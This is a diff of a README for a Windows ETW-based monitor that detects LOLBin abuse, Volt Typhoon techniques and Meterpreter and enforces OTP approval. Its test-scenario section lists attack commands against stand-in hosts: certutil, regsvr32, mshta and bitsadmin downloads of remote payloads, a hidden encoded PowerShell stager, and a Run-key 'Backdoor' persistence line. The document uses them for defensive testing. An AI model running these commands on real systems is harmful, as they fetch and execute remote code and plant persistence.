@@ -1,161 +1,114 @@
-# Usermode Application LOLBin Interceptor
+# usermodeapplicationlol
 
 ## Overview
-This project is a real-time security system for Windows that monitors process creation events, detects suspicious or malicious activity (such as LOLBin abuse, Volt Typhoon TTPs, and obfuscated commands), and enforces user or administrator validation via OTPs. It combines C++ (for ETW monitoring and process control) and Python (for advanced pattern-based detection).
+
+**usermodeapplicationlol.exe** is a user-mode Windows security monitor designed to detect, block, and log advanced attack techniques, including Meterpreter, Volt Typhoon, and LOLBIN-based attacks. It leverages ETW (Event Tracing for Windows) for real-time monitoring, and enforces user/admin intervention via OTPs for suspicious actions.
 
 ---
 
-## Architecture
+## Key Security Features
 
-### Main Components
-- **C++ ETW Monitor (`usermodeapplicationlol.cpp`)**: Monitors process creation, checks for suspicious activity, and enforces OTP validation or process termination.
-- **Python Analyzer (`analyze.py` + `detection/`)**: Analyzes process details for known malicious patterns, obfuscation, and advanced threat behaviors.
-- **OTP Verification (`otpverify.exe`)**: Validates user/admin OTPs for process override.
-- **Logging**: All actions and events are logged for auditing.
-
-### Process & Dataflow Diagram
-```mermaid
-flowchart TD
-    A["Process Creation (ETW Event)"] --> B{"Is LOLBin or Suspicious?"}
-    B -- "No" --> C["Allow Process"]
-    B -- "Yes" --> D["Call analyze.py"]
-    D --> E{"Malicious?"}
-    E -- "No" --> F["Resume/Allow Process"]
-    E -- "Yes" --> G{"Is Admin?"}
-    G -- "No" --> H["Terminate Process"]
-    G -- "Yes" --> I["Prompt for 2 Admin OTPs"]
-    I --> J{"Both OTPs Correct?"}
-    J -- "Yes" --> F
-    J -- "No" --> H
-    %% Dataflow overlays
-    A -.->|"Process Info"| D
-    D -.->|"Exit Code"| E
-    I -.->|"OTP"| J
-```
+- **ETW-based Monitoring:**
+  - Process creation, memory operations, DLL loads, and registry changes
+- **LOLBIN & Suspicious Command Detection:**
+  - Detects and blocks dangerous use of built-in Windows binaries
+- **PowerShell Deobfuscation:**
+  - Decodes and analyzes obfuscated/encoded PowerShell commands
+- **Process Hollowing Detection:**
+  - Compares in-memory and on-disk hashes to detect hollowed processes
+- **Registry Persistence Rollback:**
+  - Detects and deletes unauthorized persistence attempts in the registry
+- **OTP Enforcement:**
+  - Requires user/admin OTPs for suspicious or malicious actions
+- **Thread-safe Logging:**
+  - Logs all events, malicious events, and invalid OTP attempts
+- **Python ML/Heuristic Analysis:**
+  - Uses `analyze.py` for advanced command-line analysis
 
 ---
 
-## Features
-- **Real-time process monitoring** using ETW.
-- **LOLBins detection** (hardcoded list and pattern-based).
-- **Volt Typhoon TTP detection** (pattern-based).
-- **Obfuscation detection** (flags any obfuscated command as malicious).
-- **OTP challenge** for suspicious/malicious processes.
-- **Admin override**: Two distinct OTPs required for admin to allow a malicious process.
-- **Comprehensive logging** for all events and actions.
+## Defense Matrix
+
+| Attack Technique         | Detection & Response                                      |
+|-------------------------|----------------------------------------------------------|
+| Process Injection       | Memory operation monitoring, suspend/terminate           |
+| Reflective DLL Loading  | DLL load monitoring, terminate                           |
+| PowerShell Obfuscation  | Deobfuscation engine, log/block                          |
+| Registry Persistence    | Registry change monitoring + rollback                    |
+| Process Hollowing       | Memory/disk image hash comparison, terminate             |
+| Fileless Execution      | Memory scanning + PowerShell deobfuscation, block/OTP    |
+| LOLBIN Usage            | Pattern matching, suspend/OTP/terminate                  |
 
 ---
 
-## Setup & Build
+## Build Instructions
 
-### Prerequisites
-- Windows 10/11 (Administrator privileges required)
-- Visual Studio (for building C++ projects)
-- Python 3.x (in PATH)
-
-### Build Steps
-1. Open `usermodeapplicationlol.sln` in Visual Studio.
-2. Build both `usermodeapplicationlol` and `otpverify` projects.
-3. Ensure `usermodeapplicationlol.exe` and `otpverify.exe` are in the same directory (or in PATH).
-4. Ensure the following Python files are present:
-    - `analyze.py`
-    - `detection/lolbin_pattern_detector.py`
-    - `detection/volt_typhoon_detector.py`
-    - `lolbin_detector.py`
+1. **Requirements:**
+   - Visual Studio (Windows, C++17 or later)
+   - Python 3.x (for analyze.py and dependencies)
+   - All source files in this repo
+2. **Build:**
+   - Open the solution in Visual Studio
+   - Build the `usermodeapplicationlol` project in Release|x64
+   - Build `otpverify.exe` (standalone OTP checker)
 
 ---
 
-## How to Use
+## Usage
 
-1. **Open a Command Prompt as Administrator.**
-   - This is required for ETW monitoring and process control.
-
-2. **Navigate to the directory containing `usermodeapplicationlol.exe`.**
-   ```sh
-   cd "D:/window driver projects/usermodeapplicationlol"
-   ```
-
-3. **Start the Monitor.**
-   ```sh
-   usermodeapplicationlol.exe
-   ```
-   - You should see output indicating the ETW monitor has started.
-
-4. **Generate Test Events.**
-   - In another terminal, run commands such as:
-     - `cmd.exe /c whoami`
-     - `powershell.exe -encodedcommand SQBtAG...`
-     - `certutil.exe -urlcache -split -f http://malicious.site file.exe`
-     - `notepad.exe` (should not be flagged)
-
-5. **Respond to OTP Prompts.**
-   - If a process is flagged as suspicious/malicious, you will see a GUI OTP prompt.
-   - Enter the correct OTP (from your configured list) to allow the process, or fail to block it.
-   - For admin override, you will be prompted for two distinct OTPs.
-
-6. **Review Logs.**
-   - Check `log_all.txt`, `log_otp_correct_malicious.txt`, and `log_otp_incorrect.txt` for details on detections and actions.
+1. **Run `usermodeapplicationlol.exe` as Administrator**
+2. **Ensure `otpverify.exe` is in the same directory or PATH**
+3. **Logs:**
+   - `log_all.txt` — all events
+   - `log_otp_correct_malicious.txt` — malicious events with correct OTP
+   - `log_otp_incorrect.txt` — invalid OTP attempts
 
 ---
 
-## Compiled Executable (x64/Release/usermodeapplicationlol.exe)
+## Example Test Scenarios
 
-After building your project in Visual Studio (Release mode), the main executable will be located at:
+### LOLBINs
+- **PowerShell Encoded Command:**
+  ```powershell
+  powershell.exe -EncodedCommand SQBFAFgAIAAnAEgAZQBsAGxvACcA
+  ```
+- **regsvr32 Remote Script:**
+  ```cmd
+  regsvr32.exe /s /n /u /i:http://<server-ip>/shell.sct scrobj.dll
+  ```
+- **mshta Fileless Payload:**
+  ```cmd
+  mshta.exe http://<server-ip>/payload.hta
+  ```
 
-```
-x64/Release/usermodeapplicationlol.exe
-```
+### Volt Typhoon
+- **Registry Persistence:**
+  ```powershell
+  Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Backdoor' -Value 'powershell.exe -nop -w hidden -EncodedCommand ...'
+  ```
+- **Chained LOLBINs:**
+  ```cmd
+  cmd.exe /c "bitsadmin /transfer ... && mshta.exe http://<server-ip>/payload.hta"
+  ```
 
-- This is the optimized, production-ready version of your monitoring application.
-- **Run this file as Administrator** to start the process monitoring system.
-- If you use OTP verification, ensure `otpverify.exe` is also present in the same directory or in your system PATH.
-
-### Best Practices for GitHub and Distribution
-- **Do NOT commit this file or any other build artifacts to your GitHub repository.**
-  - Executables and build outputs should be excluded using your `.gitignore` file.
-  - Only source code, scripts, and documentation should be tracked in git.
-- **Distribute binaries separately** (e.g., via a GitHub release, zip file, or installer) if you want to share the executable.
-- Always build from source for each environment when possible.
-
----
-
-## Testing
-- Test with known LOLBins and obfuscated commands.
-- Test benign processes to ensure they are not challenged.
-- Review log files for detection and enforcement actions.
-
----
-
-## Extending Detection
-- Add new patterns to `lolbin_detector.py` and `volt_typhoon_detector.py` for emerging threats.
-- Enhance obfuscation detection in `analyze.py` as needed.
-
----
-
-## Security Notes
-- Any obfuscated command is treated as malicious by default.
-- Only administrators can override malicious verdicts, and only with two distinct OTPs.
-- All process actions are logged for audit and review.
+### Meterpreter
+- **Reflective DLL Injection:**
+  - Use Metasploit to inject `metsrv.dll` or `ReflectiveLoader` into a process.
+- **Process Hollowing:**
+  - Use Metasploit’s process hollowing technique.
+- **Fileless Meterpreter via PowerShell:**
+  ```powershell
+  powershell.exe -nop -w hidden -EncodedCommand <meterpreter stager>
+  ```
 
 ---
 
-## ETW Trace Buffer Limitation
-
-This system relies on ETW (Event Tracing for Windows) to monitor process creation events in real time. **If the ETW trace buffer becomes full (due to high event volume or slow processing), some events may be lost.** This can result in missed detections and enforcement actions.
-
-### Impact
-- Malicious or suspicious processes may not be detected if their creation events are dropped.
-- The system may not be able to enforce OTP challenges or process termination for missed events.
-
-### Mitigation Strategies
-- **Increase ETW buffer size and count:** Configure larger and more buffers in the code to reduce the chance of overflow.
-- **Optimize event processing:** Make the ETW callback as fast as possible; offload heavy work to worker threads.
-- **Monitor for lost events:** Subscribe to ETW lost event notifications and log warnings if events are dropped.
-- **Filter unnecessary events:** Only monitor the providers and event types you need.
-
-For high-assurance environments, consider a kernel-mode driver for process monitoring, which does not suffer from ETW buffer overflow issues.
+## Notes
+- **For testing only in isolated/lab environments.**
+- **OTP codes and admin codes are demo values; replace with your own for production.**
+- **For advanced detection, ensure Python and all dependencies are installed.**
 
 ---
 
 ## License
-This project is for educational and research purposes. Use responsibly. 
+This project is for educational and research use only. 
